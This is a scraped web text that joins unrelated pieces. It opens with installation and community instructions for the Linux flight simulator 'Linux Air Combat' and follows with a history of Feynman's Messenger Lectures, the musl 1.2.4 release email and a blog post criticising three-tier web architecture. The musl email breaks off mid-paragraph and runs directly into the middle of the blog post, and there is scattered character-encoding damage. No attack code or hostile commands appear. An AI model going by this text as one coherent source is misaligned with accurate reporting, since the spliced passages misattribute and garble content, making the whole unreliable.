confirmed that some of the resulting, conventionally compiled binaries
are compatible with
some other, popular LINUX distributions. However, this binary
compatibility is dependent upon many
factors including the version of compiler and the versions of required
function libraries in use. <br>
</p>

<p><a href="https://sourceforge.net/p/linuxaircombat/discussion/lacandappimages/" target="_top">Click HERE</a>
for our discussion group focused on new versions of LAC that are
available as precompiled executables formatted for near-universal
compatibility with all popular desktop versions of LINUX according to
the well-known "AppImage" format.<br>
</p>

<p>Full
source code is available for download so that users of any LINUX
distribution can easily compile it for their use (See the "Compiling"
section
below). If your LINUX system is substantially out of the mainstream you
may find that none of our published binary versions will work for you.
In that case, compiling from
source code is generally the best way to
ensure compatibility.<br>
</p>

<span>This sim is still fully supported by
the
development team, but all of the planned features are now in place.</span>
We are
proud to declare that LAC now offers excellent hardware and software
compatibility, an easy-to-learn standard control layout, good
customizability, excellent frame rates, respectable and credible flight
models, exciting multiplayer combat,&nbsp; immersive multiplayer
missions,&nbsp; truly world-class
multi-user
player management with correspondingly powerful voice comms, and
near-universal binary compatibility to minimize any need to compile
from source code. This is
the most compatible online combat flight simulator ever published. It
works
well on virtually any LINUX desktop system ranging from Raspberry Pi on
up to monster gaming-class. The widest practical array of flight
controllers are also supported, ranging from keyboard/mouse on up
through USB "console-style" game controllers and traditional
aircraft-oriented joysticks.

<p>While we've been making all of these improvements, we've also
developed a "Linux Air Combat Server" that is now available for free
public use. In late June 2017, that server
completed the first phase of beta testing, and a high performance
hosting service now has it available at
LacServer2.LinuxAirCombat.com.&nbsp; Everybody with a recent copy
of Linux Air Combat
(since November of 2019) can now participate with us in any of our
free, ten-player online missions.&nbsp; <span><br>
</span></p>

<span><a name="Prerequisites"></a>Prerequisites
for running a compiled, binary version of LINUX AIR COMBAT<br>
</span><br>

This flight simulator is distributed in both source code and
binary executable formats for various LINUX distributions. (People that
want to compile it will find additional help in the next section of
this document.) For those that DON'T want to compile it, we offer three
options:<p>



<span>1 of 3: </span>Several popular
desktop LINUX distros offer LAC in their Repositories. (<a href="https://sourceforge.net/p/linuxaircombat/discussion/lacinrepositories/" target="_top">CLICK HERE</a> for more information).<br>

<span>2 of 3:</span> A binary "AppImage"
that works on most distros (<a href="https://sourceforge.net/p/linuxaircombat/discussion/lacandappimages/" target="_top">CLICK HERE</a> for more information). or:<br>

<span>3 of 3:</span> Precompiled binary
images bundled into our robust install kits that also include source
code.</p><p>



For
compatibility with the precompiled binary versions according to option
"3 of 3" above, LAC requires each of these
well-known, popular LINUX libraries and tools, which are generally
preinstalled in most major LINUX desktop distributions:</p><ul>

  <li>libfreeglut3</li>
  <li>libSDL1.2_0</li>
  <li>libSDL_mixer1.2_0</li>
  <li>libmesaglu1</li>
  <li>libmesa</li>
</ul>

<div><p>As of April 2018, some of those
prerequisites are NOT pre-installed on Ubuntu desktop Linux, but it is
very easy to obtain them using the well-known "apt-get" command.&nbsp; </p><big><big><small><small>For
example, the commands to install three of those prerequisite libraries,
issued into a bash command
shell, are:</small></small></big></big><br>
<big><big><small><small>
</small></small></big></big><br>
<big><big><small><small>
<span>sudo apt-get
install freeglut3</span></small></small></big></big><br>
<big><big><small><small><span>sudo apt-get
install libsdl1.2debian<br>
</span></small></small></big></big>
<big><big><small><small><span>sudo apt-get
install libsdl-mixer1.2</span></small></small></big></big></div>

<br>

<span>If LINUX is new to you, <a href="https://www.youtube.com/watch?v=8e8qsduHdmI&amp;list=PL1IYes9MY6lLtokuutRPKyOT_TqEu1svM" target="_top">CLICK HERE</a> to go to our YouTube playlist loaded
with introductory information that can get you started.</span><span><p>

Additional Prerequisites for compiling
your own version from the LINUX AIR COMBAT source code</p></span><p>



If you want to compile LAC, you will find that the well-organized
source code makes
this very easy, even for non-programmers. In addition to the
prerequisites listed above, you
will also need gcc (almost always present),&nbsp; and all of these
tools and libraries, which are generally NOT preinstalled in most major
LINUX desktop distributions:</p><ul>

  <li>gcc-c++</li>
  <li>Code::Blocks <span>(recommended, but
not required)</span><br>
  </li>
  <li>Libfreeglut-devel</li>
  <li>libSDL-devel (for SDL version 1.2)<br>
  </li>
  <li>libSDL_mixer-devel (also for SDL version 1.2)</li>
</ul>

<div><p>As of April 2018, some of those
compiling prerequisites are NOT pre-installed on Ubuntu desktop Linux,
but it is
very easy to obtain them using the well-known "apt-get" command.&nbsp; </p><big><big><small><small>For
example, the commands to install three of those prerequisite libraries,
issued into a bash command
shell, are:</small></small></big></big><br>
<big><big><small><small>
</small></small></big></big><br>
<big><big><small><small>
<span>sudo apt-get
install freeglut3-dev</span></small></small></big></big><br>
<big><big><small><small><span>sudo apt-get
install libsdl1.2-dev<br>
</span></small></small></big></big>
<big><big><small><small><span>sudo apt-get
install libsdl-mixer1.2-dev<br>
</span></small></small></big></big><big><big><small><small><span><br>
</span></small></small></big><big><small><small><span></span></small></small></big></big><big><big><small><small>For
those that want to compile LAC on Ubuntu desktop LINUX, we urge you to
use the "CodeBlocks" method as described in our "Ubuntu and LAC" forum
here: <p>

https://sourceforge.net/p/linuxaircombat/discussion/ubuntuandlac/</p></small></small></big></big><big><big><small><small><span><br>
</span></small></small></big></big><br>
</div>

<br>

<span></span>Experienced LINUX users will
recognize all of these as well-known LINUX
components. However, the exact names of these tools can vary among
different LINUX distributions, or even as distributions are updated.
You will need to adapt the names of the libraries listed above
according to the names in use on your LINUX variant. <p>



For most of the popular LINUX desktop distributions, every
one of these components will be freely available through the usual and
customary means, using free package managers. If you have a good
Internet connection, you should be able to get everything within 5 or
10 minutes and with just a few mouse clicks. For best compatibility
with other members of our online community, you will want to make sure
your libraries are up-to-date.&nbsp; <span>For
a YouTube video showing how we
obtained tools to compile a very similar project, </span><a href="https://www.youtube.com/watch?v=6Kroog87m8I" target="_top">CLICK
HERE.</a></p><p>



Compiling LAC should be easy. In our experience, it is NEVER necessary
to change even a single line of the source code. The real trick is
obtaining the correct prerequisite library files. (One source of
potential confusion derives from the fact that SDL libraries are
available in two distinct versions. We use the "classic" version 1.2.
Nowadays all of the major LINUX desktop distros provide SDL libraries
for both version 1.2 and for the newer version 2.0. LAC doesn't care if
you have both versions, but the current, production version of LAC
absolutely requires SDL version
1.2)&nbsp; <span>Furthermore, t</span></p><big><big><small><small>he
standard, well-known, free software library tools that LAC uses are
routinely updated from time to time. </small></small></big></big><big><big><small><small>If
you will be using our conventionally precompiled version on any
compatible type of desktop LINUX, you may experience odd errors unless
your LINUX is using the same version of the
required libraries. Further details about compiling LAC can be found in
FAQ #2 <a href="https://askmisterwizard.com/2019/LinuxAirCombat/LacFaq.htm" target="_top">HERE</a>.</small></small></big></big><p>

<span><a name="HardwareCompatibility"></a>Hardware
Compatibility</span></p><p>



LINUX AIR COMBAT hardware requirements are modest (it will even run
nicely on the smallest, least expensive version of the well-known,
extremely economical "Raspberry Pi Model
4b" and on the new "Raspberry Pi Model 400"). When using hardware that
was originally intended for use with
Microsoft "Windows", one
gigabyte of RAM
and an old Celeron or Pentium processor should suffice. Six levels of
graphic detail are available from a prominent configuration menu. When
configured to display in a small window with the simplest available
graphics, almost any desktop or
laptop PC built since about 2006 should be able to run it with
acceptable frame rates on any of the popular LINUX distributions.
Full-screen, high definition video using the
higher graphical levels (levels 4 and 5) will require an
accelerated
graphic card of the type made popular by nVidia, Intel, or ATi, but you
won't
need a really expensive card. We've had great success with cards that
cost U.S. $50.00 or less. </p><p>



In order to enjoy LAC's features to the fullest, try to tune its
graphic options so that it reports 60 Frames per second most of the
time. For the best, smoothest performance, we recommend a version of
LINUX using a lightweight desktop manager. LAC's demands are modest,
but if your desktop manager is heavily burdened before LAC is even
installed, there is nothing LAC can do to speed things up. When
everything is optimized, the silky smooth "feel" of LAC is amazing and
almost hypnotic!</p><p>



LINUX AIR COMBAT is intended for joystick flight controls. Joystick
axes, joystick buttons, and almost any keyboard key can be mapped to
any of 45
different flight functions and 23 comms functions, so you will be able
to set up your controls
to your liking. A joystick (like the popular, inexpensive Logitech
Extreme 3dPro) is HIGHLY recommended, but it is possible to control
LINUX AIR COMBAT with just a keyboard and mouse, or to use a "Console
Game Controller" connected via USB (wired or wireless).</p><p>

<span><a name="Downloading"></a>Downloading</span></p><p>

&nbsp;


New since 15Nov2019! Development is completed, and "production
releases" of LINUX AIR COMBAT can be downloaded for free public use.</p><p>



<span>Recent improvements
result in greater program stability, better support for players lacking
a joystick, improved visual perception of network jitter, better
support for laptop-style keyboards, easy access
to online documentation without exiting from LAC, more robust player
management, more robust handling of aircraft damage in flight,
penalties for online "fratricide", more realistic flight modeling, more
lethal guns and ordnance, additional multi-player missions, and more
powerful menu logic
allowing easy cycling of RedTeam/BlueTeam affiliation without exiting
from LAC, all while retaining
operational compatibility with all of the previous production missions
and releases.</span></p><p>



For those that DON'T want source code and have no interest in
compiling LAC, we now offer a binary version that has
been precompiled for (almost) universal compatibility with popular
desktop LINUX distros. <a href="https://sourceforge.net/p/linuxaircombat/discussion/lacandappimages/" target="_top">CLICK HERE</a> for related details.</p><p>

for the stable, compressed installation archive from our "SourceForge"
distribution
site. Check the
detailed, descriptive text carefully to make sure you select the most
appropriate
version for your needs. Every full, robust download version contains:</p><ul>

  <li>-- A compiled copy of Linux Air combat in the bin/Release
subfolder (this version was compiled for 64-bit PcLinuxOs. It may or
may not
work on
other LINUX distributions)<br>
  </li>
  <li>-- An installation script named "install.sh" that will install
and configure Linux Air Combat.</li>
  <li>-- All of the source code necessary to compile or customize your
own version of Linux Air Combat</li>
  <li>-- A "Codeblocks Project File" to make it easy to use the
free, well-known "Codeblocks" compiler GUI</li>
  <li>-- A "Makefile" for programmers that prefer to compile Linux Air
Combat without downloading or installing CodeBlocks</li>
  <li>-- One or more alternative Makefiles (in case our primary
Makefile doesn't work on your distro)<br>
  </li>
  <li>-- A set of additional subfolders containing all other necessary
resources</li>
</ul>

<span><span></span></span>After
downloading any of our distribution archives, you will find a new
"*.tar.gz" file in your designated download directory.<p>



Decompress the tar.gz file to produce
the associated
.tar file. Then de-archive
the tar file according to well-established LINUX norms. You can store
the resulting, new directory tree structure
anywhere you want it within your home filesystem (so long as you can
remember where you put it). Once you've de-archived the tar and
tar.gz archives, it's OK to delete them.<span><span><p>

Also
note that several
configuration files must be installed in specific filesystem locations
before the
compiled, executable program will run without errors. The first time
you execute LAC, it will attempt to store and access all of those files
appropriately.&nbsp; </p></span></span></p><p>

<span></span><span><span></span></span><span>Please
note that although a compiled,
executable copy of LINUX AIR COMBAT is included in your standard "Full
Kit" LAC
download, it
was compiled on a 64-bit PcLinuxOs system and may not work on other

versions,
most will need to
compile the source code to produce an appropriate executable version.
Unlike
other flight simulators, it is easy to compile LINUX AIR COMBAT, and
you can even do it all from within a friendly, graphical
environment without arcane text commands. Look for other, comprehensive
resources through numerous links on this page for detailed
instructions and video clips showing exactly how thousands of people
have done it.</span></p><p>



If you install LAC from one of our "Full Kit" install archives, within
the top-level de-archived folder, you should find an
executable
shell script named "install.sh", which automates the install process
the easy way. You are ready to run that shell script
after you compile the sourcecode&nbsp; or otherwise obtain the
appropriate executable version of LAC. </p><p>



Running that shell script from a
command window like /bin/bash will copy all of the required files into
the appropriate locations and configure the appropriate binary
executable program to run on your computer.&nbsp; <a href="http://askmisterwizard.com/2019/LinuxAirCombat/LAC%20Software%20Technology.htm" target="_top">CLICK HERE</a> for more background on downloading,
compiling, installing, and configuring LAC on a wide variety of LINUX
distros.<span></span></p><p>

&nbsp;


Also within that top-level de-archived folder, you should
find
full
source code and an associated ".cbp" file to configure the free,
well-known "CodeBlocks" Integrated Development Environment, making it
easy for you to compile and/or modify your own version of this
software. (Alternatively, if you don't want to use CodeBlocks, you can
use our "Makefile" to compile Linux Air Combat according to the usual
and customary norms. This method is not compatible with as many LINUX
systems as the "CodeBlocks" method due to minor differences among c++
compilers.)</p><p>

Community</span><p>

<span>The community of
flight simulator fanatics is small among desktop LINUX Users. At the
time of
this writing, only a few people know about
Linux Air Combat's new online server. We generally gather online on
Thursday evenings, from about 6PM until 8:00 or 9:00 PM Central USA
time, but the server is up constantly, and you might find players
anytime. Please help us pass the word.
Invite your friends to join you online as we build up this community
from its tiny state. At first, everybody will have trouble finding
others with whom we can fly. This will only succeed if we all bring
friends into the emerging new "LAC Community". Recent online activity
and improvements have focused on "Network Battle 02", "Network Battle
03"&nbsp; and on "Peabody's Mission" in Realm "1". You are more likely
to find other players in those missions than in
any of the others, and they are usually populated by a new set of
"Replay Blokes" from "Server Missions" even when no other human players
are active.&nbsp; If you are the only online
player in most of the other online missions, LAC will populate the
mission with "bot"
players (generated on your own computer) to serve as your allies and as
your opposition. Although those bots aren't very smart,&nbsp; you can
use them for target practice and to hone your tactical skills until
some more online players join your mission.</span></p></big><br>

Communication with other LAC
players </span></big></big><big>For your convenience communicating with others in the LAC
Community,
AskMisterWizard.com sponsors a Mumble server, so you will </big></small></small></big>benefit
greatly from the free, well-known "<span>Mumble</span>"
Internet voice client application. Good Mumble clients are available
for many
popular operating systems including LINUX, Apple/IOS, Android, MacOS,
and
Windows. Install it on your PC, Macintosh, Windows machine, phone, or
tablet. Use Mumble to find other online players, to arrange online
missions with them, to communicate with other LAC users during flight,
or just to chat about LAC with other users or developers. Because LAC
is new and the server is now supporting only a small community of
users, you will naturally want to know if anybody else is flying, and
the realms and missions in use. Our Mumble Server serves as your "home
base" for these activities. You and your
friends can connect to our Mumble
server at <span>LinuxAirCombat.com</span>
at any time.
Configure your Mumble server connection with a simple username that is
unique to yourself. We use Mumble's standard Public Key Infrastructure
to authenticate users the easy way, so you won't need a
password. Our server has dedicated channels for general discussion of
LAC, for technical support, and for each of our online missions and
their teams. <p>

Furthermore, if you install Mumble on the same LINUX machine hosting
LAC, you get some additional benefit: LAC will fully integrate your
local copy of Mumble into
your LAC keyboard controls and cockpit, and it will automatically
switch Mumble into the best of our channels for your selected mission
and team! (When flying LAC's online missions, you
will have best success if you are using Mumble version 1.30 or later.
However, LAC can be configured to interface almost as well with older
versions of Mumble too. LAC just needs to be told whether your Mumble
version is "old-style" or "new-style". Configure this by editing the
"NetworkMode" field of the "LacConfig.txt" file that you will find in
your new, hidden ~/home/.LAC folder, as guided by the helpful text it
contains.)</p><p>

You can find help on this and other topics in our "Beginner Topics"
forum <a href="https://sourceforge.net/p/linuxaircombat/discussion/beginnertopics/" target="_top">HERE</a>. Pay particular attention to the posting about
"Editing LAC's Configuration File".</p><big><span>Upgrades</span></big><p>

The standard, downloadable LAC distribution is tuned for a typical
LINUX desktop PC. If your PC is more powerful than the average, you can
download enhanced graphic models of the airstrip and aircraft for
improved visual appearance. On the other hand, if your PC is less
powerful, you can download simplified graphic models to help increase
your framerate for smoother flight. Either way, you will want to <a href="https://askmisterwizard.com/2019/LinuxAirCombat/Enhancements/LacEnhancements.htm" target="_top">CLICK HERE</a>

We are building a comprehensive series of short, highly focused YouTube
video clips to help you download, install, configure, and enjoy Linux
Air Combat. Most of these
video clips are less than 5 minutes in length, and many are less than
two minutes long, because each covers just a single topic. Organized as
a YouTube "playlist", you can quickly scan the many separate titles to
focus in on a specific problem or area of interest. We are adding
titles to this playlist frequently, so if you don't see what you need
right now you might find it later. Please use YouTube comments
associated with each clip to ask or answer related questions for the
LAC community. This advertising-supported effort helps to fund our
development, so we appreciate your participation and support. </p><p>

<h3>About Feynman's Messenger Lectures</h3>

<p>
In 1963 Richard Feynman was invited to give the 1964 Messenger Lectures at Cornell University, an annual tradition since 1924, when Hiram Messenger gifted Cornell with "a fund to provide a course of lectures on the Evolution of Civilization for the special purpose of raising the moral standard of our political, business, and social life", to be "delivered by the ablest non-resident lecturer or lecturers obtainable".</p>

<p>
Feynman had been a physics professor at Cornell from 1945 to 1950, during which time he did the work for which he was awarded a Nobel Prize in 1965. While at Cornell Feynman became well-known in the physics community for his innovations in quantum electrodynamics and idosyncratic style. He was at Caltech in 1963, when he was invited to become the 41st Messenger Lecturer<a id="footnote_source_1" href="#footnote_1"><sup>1</sup></a>, by which time he had become known to a much wider audience through his recently published book, Volume I of <i>The Feynman Lectures on Physics.</i><a id="footnote_source_2" href="#footnote_2"><sup>2</sup></a></p>

<p>
 According to the Cornell Faculty Website, "A Messenger Lecturer typically gives three lectures/presentations over the course of a one-week visit. At least one of these must be a lecture that is suitable for a general audience."<a id="footnote_source_3" href="#footnote_3"><sup>3</sup></a> Feynman, however, chose to give a series of <i>six</i> lectures, <i>all</i> for a general audience, which he titled <i>The Character of Physical Law</i>.<a id="footnote_source_4" href="#footnote_4"><sup>4</sup></a> He had plenty of material to draw from his recently completed introductory physics course, the basis of <i>The Feynman Lectures on Physics</i>. For this reason one finds many similarities, parallels, and even identical parts in the lectures of <i>The Character of Physical Law</i> and several of the lectures in <i>The Feynman Lectures on Physics</i>.</p>
 
 <p>
Feynman's Messenger Lectures were videotaped by the BBC, who in 1965 published a hardbound book of edited lecture transcripts under the title, <i>The Character of Physical Law</i>. In 1967 the paperback rights were licensed to MIT Press who continues to print the book today.<a id="footnote_source_5" href="#footnote_5"><sup>5</sup></a> The videotapes were transferred to film, and in the late 1960s through the '70s copies of the films were in wide distribution at colleges and universities.<a id="footnote_source_6" href="#footnote_6"><sup>6</sup></a> Sadly, however, these wonderful films of Feynman lecturing at the peak of his prowess went out of distribution and became generally unavailable in the 1980s.</p>

<p>
In 2009, when Microsoft Research introduced their Silverlight framework for media-rich web applications, Bill Gates licensed rights to stream the BBC's films of Feynmanâs Messenger Lectures online. Hoping to encourage others to make educational content available for free, he used them in the first Silverlight demo, âProject Tuva.â<a id="footnote_source_7" href="#footnote_7"><sup>7</sup></a> The publication of Feynmanâs Messenger Lectures for free online viewing, with special features such as searchable synchronized scrolling transcripts, links to related online material, and  commentary, was an instant hit with Feynman fans, students and physicists. The Silverlight framework, however, was not widely adopted, and in 2016 Project Tuva was retired. The videos were still available for viewing on the Microsoft Research Website (though without the special features) until 2021, when their BBC license expired. The license has since been generously renewed by Bill Gates so that the videos can continue to be shown online to users of The Feynman Lectures Website.</p>

<pre>Date: Mon, 1 May 2023 23:47:32 -0400
From: Rich Felker &lt;dalias@...c.org&gt;
To: musl@...ts.openwall.com
Subject: musl 1.2.4 released

This release adds TCP fallback to the DNS stub resolver, fixing the
longstanding inability to query large DNS records and incompatibility
with recursive nameservers that don't give partial results in
truncated UDP responses. It also makes a number of other bug fixes and
improvements in DNS and related functionality, including making both
the modern and legacy API results differentiate between NODATA and
NxDomain conditions so that the caller can handle them differently.

On the API level, the legacy "LFS64" ("large file support")
interfaces, which were provided by macros remapping them to their
standard names (#define stat64 stat and similar) have been deprecated
and are no longer provided under the _GNU_SOURCE feature profile, only
under explicit _LARGEFILE64_SOURCE. The latter will also be removed in
a future version. Builds broken by this change can be fixed short-term
by adding -D_LARGEFILE64_SOURCE to CFLAGS, but should be fixed to use
the standard interfaces.

The dynamic linker (and static-PIE entry point code) adds support for
the new compact "RELR" format for relative relocations which recent
linkers can generate. Use of this linker feature for dynamic-linked
programs will make them depend on having musl 1.2.4 or later available
at runtime. Static-linkied PIE binaries using it, as always, are
self-contained and have no such dependency.

A large number of bugs have been fixed, including many in the wide
printf family of functions, incorrect ordering of digits vs non-digits
in strverscmp, and several rare race-condition corner cases in thread
synchronization logic at thread exit time, in multi-threaded fork,
pthread_detach, and POSIX semaphores.

This is the number of things we can keep in our minds without losing focus. So, logically, a three-tier software architecture (database, backend and frontend) is a great model.</p><p id="c81b">Right? We thought so, too.</p><p id="77da"><strong>Then why does building a feature take so much time?</strong></p><p id="1d68">As engineers, tech leaders, and developers, we often find ourselves mired in the complexities of application âplumbing.â</p><p id="d736">The three-tier model burdens developers with an array of time-consuming trivialities. From endlessly shuffling bytes between the three layers to tediously defining data structures three times over, we wrestle with synchronization overhead across different codebases while striving to optimize performance, manage database schema changes, and maintain data consistency.</p><p id="6605">This leaves us yearning for more time to innovate and build cool new features for our users.</p><p id="a62f">Now, it makes sense: weâve lost sight that even in a clear 3-tiers architecture, there are more than three things to consider. We, solo developers and small teams, always have to reserve some mental space for non-technical matters, such as the users, their needs, and communication. And even in the technical realm, having three cleanly separated layers still forces us to think about two more things: communication and synchronization between consecutive layers.</p><p id="1121">Looking at the three-tier architecture, we can see how every tier and their integration keep us busy. Letâs say you have a small blogging application and want to add a âcategoryâ to each blog post. That sounds like a simple thing to add. But if you follow all the <em>good practices</em> of typical modern web development, here is what youâll probably have to do:</p><ul><li id="a0f7">Write a database schema migration that creates the new post category structure in the database. Optionally, write a âdownâ migration that removes it to be able to roll back your changes quickly if necessary.</li><li id="390e">Update your Go struct definitions, Java classes, or whatever backend language-specific structure definitions you use, ideally keeping compatibility with the old and the new database schema. Write backend unit tests for the functions that handle this new data structure.</li><li id="a17f">Write new database queries and document the changes in your API responses.</li><li id="ab30">Update the TypeScript types in your frontend to add the new field, keeping the ability to parse backend responses both with and without the field. Write unit tests for that logic.</li><li id="76cf">Update your React components to display the postâs category.</li><li id="5b48">Ensure data validation for the category is consistent across all layers.</li><li id="75a1">Write an integration test to ensure that the new code on each of the three layers works fine with the rest of the system.</li><li id="9ae7">Synchronize the rollout of updates between the database schema, backend, and frontend. If multiple teams are working on the project, ensure they are all on the same page about when and how the rollout will happen.</li></ul><p id="9f25">Ultimately, what is just a tiny line of text at the top of blog posts for the users becomes a daunting task, representing tens of hours of engineering work to implement.</p><p id="998f">This inefficiency extends to the end-users. Shuffling bytes between multiple layers has a cost: network latency, serialization and deserialization of data, etc. Itâs hard to convince people that itâs normal loading a post on Reddit, which contains no more than a few bytes of useful information, to take tens of seconds on their holiday 3G connection. Itâs also hard to explain why we canât do something trivial to the user because it would take too many resources.</p><h2 id="6717">How did we end up here?</h2><p id="bb34">The three-tier architecture is a masterful construct born from the ingenuity of digital artisans seeking to optimize the division of labour.</p><p id="7350">It did not emerge as a torture instrument for web developers but as a response to the growing complexity of web applications. The specialization of labor is the reason why we are not all hunter-gatherers anymore. Similarly, the three-tier model allows us to seek excellence in each specialized function. While it may serve larger organizations with specialized teams well, applying it rigidly in smaller settings is counterproductive. You also canât ignore that specialization and separating work typically lead to much longer delivery cycles due to the synchronization and communication overhead. How often have you seen such teams ship fast?</p><p id="efb1">Specialization is great when you have a conveyor belt. This implies your inputs and outputs are stable, predictable, and your timing is set. Smaller organizations and individual developers may not have such a luxury. Instead, they may benefit from being able to react and adapt faster. So the shorter their shipping cycle, the better.</p><h2 id="e1ab">The road ahead</h2><p id="9375">Thankfully, we are not alone in recognizing these challenges. A new generation of tools is emerging to bridge the gap and achieve the goal of rapid application development.</p><h2 id="bad2">How people work around the problem today</h2><p id="ea0c">Developers have adopted several workarounds to mitigate the issues of the three-tier model. These include:</p><ol><li id="e83c"><strong>No-code tools</strong>: Tools like Budibase have significantly reduced development time, allowing semi-technical people to build a full application quickly. But their inflexibility and maintenance challenges often limit their long-term viability. Writing an application in a no-code tool is a non-starter if you want it to grow and evolve in the future without having to rewrite it from scratch. And letting go of modern version management software to send emails to colleagues to âplease not touch that because Iâm working on itâ feels like going back to the middle ages. Besides, few no-code tools are interested in you being able to leave their platform easily.</li><li id="79b6"><strong>Backend as a service (BaaS)</strong>: Services like Firebase provide pre-made, one-size-fits-all backends, removing a lot of the backend and database work duplication and greatly accelerating app development. However, they are often trying to hold their users captive. They make local development difficult. They make your application less self-reliant and more expensive to host, deploy, and maintain. Many of these BaaS either end up being abandoned or acquired, leaving everyone rushing to rewrite their code to use something else. And even when everything goes well with your provider, you still need to handle the synchronization between your frontend and your BaaS.</li><li id="553b"><strong>Database-over-HTTP web servers</strong>: Tools like PostgREST and Hasura GraphQL expose a database over HTTP. They tremendously reduce the work developers need to do on the backend, while still being quite lightweight, easy and cheap to deploy. But they solve only a part of the problem. Their goal is not to be a sufficient approach to build a complete application, and they still require you to spend time synchronizing your frontend code and database structure. You cannot do much more to answer a web request than just representing the database contents as it is, unprocessed, but in JSON.</li></ol><h2 id="8d94">How are we trying to solve this</h2><p id="fada">We see all the solutions mentioned above as steps in the right direction but are still not satisfied with the state of rapid application development tools. We believe itâs not only possible, but even probable that in the near future, building a full stack production-ready application will take ten times less effort than today. And rather than waiting for the tooling of the future to arrive, we are uniting, and authoring these tools today, to make this vision a reality. We are not pretending we have found the definitive answer to the triple work problem yet, but the projects we work on already significantly reduce the time it takes to go from an idea to a working web application today without sacrificing the ease of collaborative development and the speed of deployment.</p><ul><li id="d202">For instance, Ophir is working on <a href="https://sql.ophir.dev/" rel="noopener ugc nofollow" target="_blank"><strong>SQLPage</strong></a>, a fast application development framework based on SQL that makes building graphical web applications as simple as writing a database query. SQLPage offers a database-agnostic solution without any dependencies. With SQL as the foundation, you can build a full web app in just one day.</li><li id="d050">Similarly, Yurii is developing <a href="https://omnigres.com/" rel="noopener ugc nofollow" target="_blank"><strong>Omnigres</strong></a>: Designed for larger applications, Omnigres simplifies the development of complex backend logic that runs directly inside a Postgres database. It transforms Postgres into a full back-end application platform.</li></ul><figure><figcaption>Our dream is to enable fluid translation of ideas into working applications.</figcaption></figure><h2 id="8ded">Avoiding triple work in your next project</h2><p id="96b5">The three-tier model has its drawbacks, especially for solo developers and small teams, causing developers to spend excessive time on repetitive tasks and affecting both application performance and development pace.</p><p id="8543"><strong>What is your take on the subject? </strong>If you have felt the hurdles of triple work before and would be interested in migrating to something else, we would love to hear about it in the comments below. If, on the contrary, you think the three-tier model is the way to go even for small teams and building an entire app in the database is a terrible idea, we would love to hear your arguments, too!</p></div><div><p id="3980"><em>This post is written in collaboration between Ophir Lojkine and Yurii Rashkovskii.</em></p></div></div>]]></description>
